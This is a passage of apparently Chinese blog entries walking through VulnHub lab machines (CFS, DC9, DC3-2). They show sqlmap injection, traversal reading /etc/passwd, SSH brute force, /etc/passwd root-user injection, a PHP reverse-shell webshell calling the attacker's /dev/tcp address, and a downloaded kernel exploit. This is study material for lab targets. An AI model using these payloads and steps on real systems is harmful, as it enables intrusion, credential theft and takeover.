src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/49.jpg" class=""><p>设置payload、rhost、lport</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/bind_tcp(注意变化)<br><span class="hljs-built_in">set</span> rhost 192.168.22.129(现在是Ubuntu的内网IP)<br><span class="hljs-built_in">set</span> lport 5555<br>run<br></code></pre></td></tr></table></figure><h2 id="打穿win7">打穿win7</h2><h3 id="信息搜集-3">信息搜集</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> get_local_subnets<br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/50.jpg" class=""><h3 id="msf代理配置">msf代理配置</h3><h4 id="配置路由">配置路由</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> autoroute -s 192.168.33.0/24<br><span class="hljs-built_in">run</span> autoroute -p<br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/51.jpg" class=""><h4 id="开启msf代理模块">开启msf代理模块</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/server/socks_proxy<br><span class="hljs-keyword">set</span> srvport 3333<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">version</span> 4a<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><h4 id="修改配置文件">修改配置文件</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">vi</span> /etc/proxychains4.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><h4 id="获取主机权限-2">获取主机权限</h4><p>设置代理后启动新的msf</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">proxychains msfconsole</span><br></code></pre></td></tr></table></figure><p>扫描目标主机window7的端口</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.33.33</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/52.jpg" class=""><p>开启了445端口，试一下永恒之蓝MS17-010</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_psexec<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> RHOSTS 192.168.33.33<br><span class="hljs-built_in">set</span> LPORT 6666<br>run<br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/53.jpg" class=""><p>成功拿到shell</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/54.jpg" class=""><p>找到flag：flag{ASf12asf2sd}</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">cd</span> config<br><span class="hljs-built_in">dir</span><br><span class="hljs-built_in">more</span> flag.txt<br></code></pre></td></tr></table></figure><img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/55.jpg" class=""><p>注：flag可能在桌面、C:\Windows\System32\config、任务计划、注册编辑器</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub靶场</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DC9</title>
    <link href="/2024/02/24/vulnhub%E2%80%94DC9/"/>
    <url>/2024/02/24/vulnhub%E2%80%94DC9/</url>
    
    <content type="html"><![CDATA[<h1>信息搜集</h1><h2 id="主机发现">主机发现</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> netdiscover <span class="hljs-number">192.168.12.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>发现目标主机IP为192.168.12.132</p><h2 id="端口探测">端口探测</h2><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap -sS -sV -<span class="hljs-keyword">A</span> -n <span class="hljs-number">192.168.12.132</span><br>nmap -p- -<span class="hljs-keyword">A</span> -T<span class="hljs-number">5 192.168.12</span>.<span class="hljs-number">132</span><br>nmap -T4 -sV -<span class="hljs-keyword">A</span> -O -p- <span class="hljs-number">192.168.12.132</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC9/1.jpg" class=""><img src="/2024/02/24/vulnhub%E2%80%94DC9/2.jpg" class=""><p>第一种和第二种扫描结果基本一样，第二种明显慢</p><p>第三种每个端口下对应信息更多，速度和第二种差不多</p><p>22端口被过滤，80端口开放</p><h2 id="访问网页，寻找可能的漏洞">访问网页，寻找可能的漏洞</h2><h3 id="查找输入框">查找输入框</h3><p>在Search中发现提交框</p><img src="/2024/02/24/vulnhub%E2%80%94DC9/3.jpg" class=""><img src="/2024/02/24/vulnhub%E2%80%94DC9/4.jpg" class=""><h3 id="查找提交字段名">查找提交字段名</h3><p>抓包发现字段名为‘search’</p><img src="/2024/02/24/vulnhub%E2%80%94DC9/5.jpg" class=""><h1>SQL注入</h1><h2 id="爆破数据库">爆破数据库</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">sqlmap</span> -u <span class="hljs-string">&quot;http://192.168.12.132/results.php&quot;</span> --<span class="hljs-meta">data</span> <span class="hljs-string">&quot;search=1&quot;</span> -dbs<br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC9/6.jpg" class=""><h3 id="爆破数据库users">爆破数据库users</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.12.132/results.php&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=1&quot;</span> -D users <span class="hljs-params">--tables</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC9/7.jpg" class=""><p>爆破表中所有信息，列出管理员账号密码</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.12.132/results.php&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=1&quot;</span> -D users -T UserDetails <span class="hljs-params">--dump</span><br></code></pre></td></tr></table></figure><p>好像没有类似于管理员的信息</p><img src="/2024/02/24/vulnhub%E2%80%94DC9/8.jpg" class=""><h3 id="爆破数据库staff">爆破数据库staff</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.12.132/results.php&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=1&quot;</span> -D Staff <span class="hljs-params">--tables</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC9/9.jpg" class=""><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.12.132/results.php&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=1&quot;</span> -D Staff -T users <span class="hljs-params">--dump</span><br></code></pre></td></tr></table></figure><p>获取到管理员账号和密码：admin；transorbital1</p><img src="/2024/02/24/vulnhub%E2%80%94DC9/10.jpg" class=""><h2 id="管理员登录">管理员登录</h2><img src="/2024/02/24/vulnhub%E2%80%94DC9/11.jpg" class=""><h1>文件包含</h1><p>提示：File does not exist</p><p>猜测可能是文件包含漏洞</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><blockquote><p>端口试探（port knocking）是一种通过连接尝试，从外部打开原先关闭端口的方法。一旦收到正确顺序的连接尝试，防火墙就会动态打开一些特定的端口给允许尝试连接的主机。</p><p>端口试探类似于一次秘密握手协议，比如一种最基本的方式：发送一定序列的UDP、TCP数据包。当运行在主机上的daemon程序捕捉到数据包以后，如果这个序列正确，则开启相应的端口，或者防火墙允许客户端通过。</p><p>端口敲门是计算机等同于一个组合数字锁，恰当的组合数字解锁特定的TCP或UDP服务来远程访问。恰当的组合数字使所要求的服务从特定IP地址可见。否则，它仍然是隐藏的。 一些端口敲门程序依赖于发送数据到特定的UDP和/或TCP端口号，其他的使用ICMP信息，并且一些要求使用强加密的特定的客户端应用程序来发送解锁序列。重要的事情是记住端口敲门的概念是为一个特定的IP地址解锁并访问特定的TCP或UDP服务。</p></blockquote><h1>端口敲门</h1><h2 id="方法一：knockd">方法一：knockd</h2><p>knockd服务的默认配置路径：/etc/knockd.conf</p><p>使用文件包含漏洞遍历，获取敲门的密码：sequence = 7469,8475,9842</p><img src="/2024/02/24/vulnhub%E2%80%94DC9/12.jpg" class=""><p>安装knockd服务</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> install knockd<br></code></pre></td></tr></table></figure><p>编辑配置文件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> /etc/knockd.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC9/13.jpg" class=""><p>敲门</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">knock</span> <span class="hljs-number">192.168.12.132</span> <span class="hljs-number">7469</span> <span class="hljs-number">8475</span> <span class="hljs-number">9842</span><br></code></pre></td></tr></table></figure><p>再次查看端口开放情况</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -p <span class="hljs-number">22</span> <span class="hljs-number">192.168.12.132</span><br></code></pre></td></tr></table></figure><p>22端口成功被打开</p><img src="/2024/02/24/vulnhub%E2%80%94DC9/14.jpg" class=""><p>把原来users数据库中的用户名和对应密码保存下来</p><img src="/2024/02/24/vulnhub%E2%80%94DC9/15.jpg" class=""><h2 id="方法二：nc">方法二：nc</h2><p>依次输入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.12.132</span> <span class="hljs-number">7469</span><br><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.12.132</span> <span class="hljs-number">8475</span><br><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.12.132</span> <span class="hljs-number">9842</span><br></code></pre></td></tr></table></figure><h1>hydra爆破</h1><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">hydra -L username -P <span class="hljs-keyword">pwd</span> ssh:<span class="hljs-string">//192.168.12.132</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC9/16.jpg" class=""><p>用提示的3个用户进行登录，发现有用信息</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> joeyt@<span class="hljs-number">192.168.12.132</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC9/17.jpg" class=""><p>没有什么信息</p><p>权限不够的用户输入<code>sudo -l</code>会提示：Sorry, user janitor may not run sudo on dc-9.</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> janitor@<span class="hljs-number">192.168.12.132</span><br></code></pre></td></tr></table></figure><p>发现隐藏文件secrets-for-putin</p><img src="/2024/02/24/vulnhub%E2%80%94DC9/18.jpg" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> secrets-for-putin<br></code></pre></td></tr></table></figure><p>添加密码再次爆破</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">hydra -L username -P <span class="hljs-keyword">pwd</span> ssh:<span class="hljs-string">//192.168.12.132</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC9/19.jpg" class=""><p>发现一个新用户</p><p>用该用户的身份进行登录，输入sudo -l，列出权限，发现“root”</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> fredf@<span class="hljs-number">192.168.12.132</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC9/20.jpg" class=""><h1>本地提权</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd opt<span class="hljs-regexp">/devstuff/</span>dist<span class="hljs-regexp">/test/</span><br></code></pre></td></tr></table></figure><p>运行test，发现是一个python文件</p><img src="/2024/02/24/vulnhub%E2%80%94DC9/21.jpg" class=""><p>查找python文件并查看</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -name test.py <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>大概的就是将参数1的内容写到参数2中然后生成一个用户</p><img src="/2024/02/24/vulnhub%E2%80%94DC9/22.jpg" class=""><p>创建一个admin用户</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> passwd -<span class="hljs-number">1</span> -salt admin <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>把/etc/passwd的格式修改一下 然后写入/tmp</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">echo</span> <span class="hljs-string">&#x27;admin:<span class="hljs-variable">$1</span><span class="hljs-variable">$admin</span><span class="hljs-variable">$LClYcRe</span>.ee8dQwgrFc5nz.:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /tmp/passwd<br></code></pre></td></tr></table></figure><p>运行test</p><p>注意执行这条语句需要进入这个目录/opt/devstuff/dist/test</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./test /tmp/passwd.txt /etc/passwd<br></code></pre></td></tr></table></figure><p>查看</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>passwd <br></code></pre></td></tr></table></figure><p>切换admin用户</p><img src="/2024/02/24/vulnhub%E2%80%94DC9/23.jpg" class=""><p>获取flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">cat</span> thefalg.txt<br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC9/24.jpg" class="">]]></content>
    
    
    <categories>
      
      <category>vulnhub靶场</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DC3-2</title>
    <link href="/2024/02/24/vulnhub%E2%80%94DC3-2/"/>
    <url>/2024/02/24/vulnhub%E2%80%94DC3-2/</url>
    
    <content type="html"><![CDATA[<h1>信息搜集</h1><h2 id="主机发现">主机发现</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sn -PR <span class="hljs-number">192.168.12.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>攻击机：192.168.12.128</p><p>目标主机：192.168.12.131</p><p>kali：192.168.12.130</p><h2 id="开放端口及服务扫描">开放端口及服务扫描</h2><h3 id="方法1">方法1</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap -sS -sV -<span class="hljs-keyword">A</span> -n <span class="hljs-number">192.168.12.131</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/1.jpg" class=""><h3 id="方法二">方法二</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">nmap -T4 -sV -O -<span class="hljs-selector-tag">A</span> -<span class="hljs-selector-tag">p</span>- <span class="hljs-number">192.168</span><span class="hljs-selector-class">.12</span><span class="hljs-selector-class">.131</span><br><span class="hljs-built_in">-T4</span>(速度) <span class="hljs-built_in">-sV</span>(版本扫描和开启的服务) <span class="hljs-built_in">-O</span>(操作系统) -<span class="hljs-selector-tag">p</span>-（全部端口）<br></code></pre></td></tr></table></figure><p>感觉第一种更快一些</p><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/2.jpg" class=""><h2 id="爆破目录">爆破目录</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dirb</span> <span class="hljs-number">192.168.12.131</span><br></code></pre></td></tr></table></figure><p>发现<code>http://192.168.12.131/administrator/</code></p><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/3.jpg" class=""><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/4.jpg" class=""><h1>漏洞利用（使用Joomsan攻击Joomla CMS）</h1><h2 id="初步扫描">初步扫描</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">joomscan <span class="hljs-params">--url</span> http:<span class="hljs-string">//192.168.12.131</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/5.jpg" class=""><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/6.jpg" class=""><p>发现版本为3.7.0</p><h2 id="漏洞信息搜集">漏洞信息搜集</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> Joomla <span class="hljs-number">3</span>.<span class="hljs-number">7</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/7.jpg" class=""><p>发现有SQL注入</p><h2 id="SQL漏洞地址确认">SQL漏洞地址确认</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/exploitdb/</span>exploits<span class="hljs-regexp">/php/</span>webapps/<span class="hljs-number">42033</span>.txt 查看漏洞文件<br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/8.jpg" class=""><h2 id="Sqlmap攻击">Sqlmap攻击</h2><p>根据提示指令进行攻击</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u &quot;<span class="hljs-link">http://192.168.12.131/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br></code></pre></td></tr></table></figure><p>爆破出了很多库</p><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/9.jpg" class=""><p>猜测想要的数据在Joomlabd中，爆破joomladb库中的所有表名</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u &quot;<span class="hljs-link">http://192.168.12.131/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables -p list[fullordering]<br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/10.jpg" class=""><p>爆破users表中的所有字段</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u &quot;<span class="hljs-link">http://192.168.12.131/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns -p list[fullordering]<br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/11.jpg" class=""><p>爆破字段，得到密码</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u &quot;<span class="hljs-link">http://192.168.12.131/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C id,nmae,password,username --dump -p list[fullordering]<br></code></pre></td></tr></table></figure><p>拿到密码的密文格式：<code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/12.jpg" class=""><h2 id="破解加密的密码">破解加密的密码</h2><h3 id="新建txt写入密文">新建txt写入密文</h3><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/13.jpg" class=""><h3 id="使用john工具破解密码">使用john工具破解密码</h3><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">john</span> <span class="hljs-params">(txt)</span></span><br></code></pre></td></tr></table></figure><p>密码明文为snoopy！</p><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/14.jpg" class=""><h3 id="登录网站后台">登录网站后台</h3><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/15.jpg" class=""><h3 id="编辑index-php文件，写入木马">编辑index.php文件，写入木马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp;  /dev/tcp/192.168.12.130/9966 0&gt;&amp;1&#x27;&quot;</span>); <span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#一句话脚本</span><br><span class="hljs-comment">#这里的IP地址填kali渗透机的IP地址</span><br><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/16.jpg" class=""><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/17.jpg" class=""><h3 id="kali上开启一个端口进行监听">kali上开启一个端口进行监听</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">9966</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/18.jpg" class=""><h3 id="网页访问index-php，触发webshell">网页访问index.php，触发webshell</h3><p>成功反弹shell</p><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/19.jpg" class=""><p>发现操作系统版本16.04，低权限</p><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/20.jpg" class=""><h2 id="提权">提权</h2><h3 id="对操作系统版本进行漏洞探测">对操作系统版本进行漏洞探测</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> Ubuntu <span class="hljs-number">16</span>.<span class="hljs-number">04</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/21.jpg" class=""><p>选择使用以下漏洞</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Linux</span> Kernel <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.x (Ubuntu <span class="hljs-number">16</span>.<span class="hljs-number">04</span>) - &#x27;double-fdput()&#x27; bpf(BPF_PROG_LOAD) Privilege Escalation                                                                                                                                           | linux/local/<span class="hljs-number">39772</span>.txt<br><br></code></pre></td></tr></table></figure><p>提权思路：靶机上面是没有这个文件的，所以我们需要把这个文件cp到本地，再在kali渗透机上面搭建一个简易的服务器，操纵靶机下载这个文件并执行，拿到靶机root权限。</p><h3 id="查看漏洞文件">查看漏洞文件</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/exploitdb/</span>exploits<span class="hljs-regexp">/linux/</span>local<span class="hljs-regexp">/39772.txt  /</span>home<span class="hljs-regexp">/kali/</span>桌面/shell.txt<br><span class="hljs-comment">#查看漏洞介绍，并下载exp</span><br></code></pre></td></tr></table></figure><p><code>https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code></p><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/22.jpg" class=""><h3 id="受害机下载恶意文件">受害机下载恶意文件</h3><p>在得到的shell里下载</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/offensive-security/</span>exploitdb-bin-sploits<span class="hljs-regexp">/raw/m</span>aster<span class="hljs-regexp">/bin-sploits/</span><span class="hljs-number">39772</span>.zip --no-check-certificate<br></code></pre></td></tr></table></figure><img src="/2024/02/24/vulnhub%E2%80%94DC3-2/23.jpg" class=""><h3 id="执行文件，拿到root权限">执行文件，拿到root权限</h3><p>解压并运行文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">unzip</span> <span class="hljs-number">39772</span>.zip<br><span class="hljs-attribute">cd</span> <span class="hljs-number">39772</span><br><span class="hljs-attribute">tar</span> -xvf exploit.tar<br></code></pre></td></tr></table></figure><img 